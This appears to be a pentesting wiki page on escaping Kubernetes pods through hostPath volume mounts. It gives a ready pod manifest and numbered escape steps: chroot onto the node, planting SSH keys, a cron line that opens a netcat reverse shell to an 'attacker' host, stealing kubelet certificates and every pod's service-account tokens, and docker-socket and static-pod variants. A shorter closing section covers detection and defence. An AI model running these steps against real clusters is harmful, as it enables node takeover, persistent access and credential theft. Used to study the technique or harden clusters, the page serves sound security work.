---
title: Host-mount escape
slug: k8s-host-mount-escape
---

> **TL;DR:** A pod with a `hostPath` volume mounting `/`, `/var/run/docker.sock`, `/var/lib/kubelet`, or any node directory the container can write to is functionally root on the node — drop a SUID binary, write into `/etc/cron.d`, or steal kubelet creds and pivot the whole cluster.

## What it is
`hostPath` volumes bind a node directory into a pod. Unlike privileged containers, hostPath alone does not require `privileged: true` — only the pod spec field and a writable node path. If the pod runs as root (default) and the mount is `/`, the container can write anywhere on the node. Even narrower mounts grant escape: `/var/run/docker.sock` and `/run/containerd/containerd.sock` are unsockets-of-doom, and `/var/lib/kubelet/pods` exposes every other pod's service-account tokens.

## Preconditions / where it applies
- `pods/create` (directly or via Deployment/Job) in some namespace, with no admission policy blocking `hostPath` (or [[k8s-admission-controllers]] bypass available).
- Or: existing pod with a juicy hostPath mount + RCE in that pod.
- Worker node not using read-only root + immutable infrastructure that blocks the secondary techniques.

## Technique
**Manifest — root-of-node mount:**

```yaml
apiVersion: v1
kind: Pod
metadata: {name: esc, namespace: default}
spec:
  hostPID: true
  containers:
  - name: x
    image: alpine
    command: ["sh","-c","sleep infinity"]
    securityContext: {runAsUser: 0}
    volumeMounts:
    - {name: host, mountPath: /host}
  volumes:
  - name: host
    hostPath: {path: /, type: Directory}
```

**Escape paths once inside the pod:**

1. **chroot to host** — `chroot /host /bin/sh`. You are root on the node, full control.
2. **SSH key plant** — `cat ~/.ssh/id_ed25519.pub >> /host/root/.ssh/authorized_keys`. Persist outside the cluster.
3. **Cron drop** — `echo '* * * * * root nc attacker 4444 -e /bin/sh' > /host/etc/cron.d/x`.
4. **Steal kubelet client cert** — `/host/var/lib/kubelet/pki/kubelet-client-current.pem`. Reauthenticate to the API server as the node, which often has heavy RBAC.
5. **Steal every pod's SA token** — `/host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected-token/*/token`. One of them is probably a cluster-admin operator.

**Docker/containerd socket variant:** mount `/var/run/docker.sock` or `/run/containerd/containerd.sock`. Run `docker run --privileged -v /:/host alpine chroot /host` from inside the pod.

**Read-only root subversion:** even with `readOnlyRootFilesystem: true` on the container, the hostPath mount is independently writable. `chroot` still works.

**Narrower mounts still escape:**
- `/var/log` → write to a log file then symlink it to `/etc/shadow` (logrotate runs as root).
- `/etc/kubernetes/manifests` on a control-plane node → drop a static pod manifest; kubelet starts it as `kube-system/<name>` with whatever spec you choose, including hostPath / privileged.

Chain into [[k8s-service-account-tokens]] for cluster-wide pivot and [[k8s-privileged-pod]] for the policy-blocking-failure variant.

## Detection and defence
- Block `hostPath` via Pod Security Standards `restricted` profile or a policy engine (Kyverno/Gatekeeper rule `disallow-host-path`).
- Run nodes with `--read-only-port=0` and rotate kubelet client certs.
- Audit `pods/create` events with `volumes[*].hostPath` set — high signal.
- Use `runAsNonRoot: true` and `allowPrivilegeEscalation: false` baseline.
- Detect via Falco rules `Write below etc` and `Mount /host` patterns inside containers.
- Don't run user workloads on control-plane nodes; taint them.

## References
- [Kubernetes — Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) — baseline/restricted/privileged
- [HackTricks — k8s pentest](https://book.hacktricks.wiki/en/pentesting-network/pentesting-kubernetes/index.html) — hostPath escapes
- [Falco rules — host escape](https://github.com/falcosecurity/rules) — detection signatures
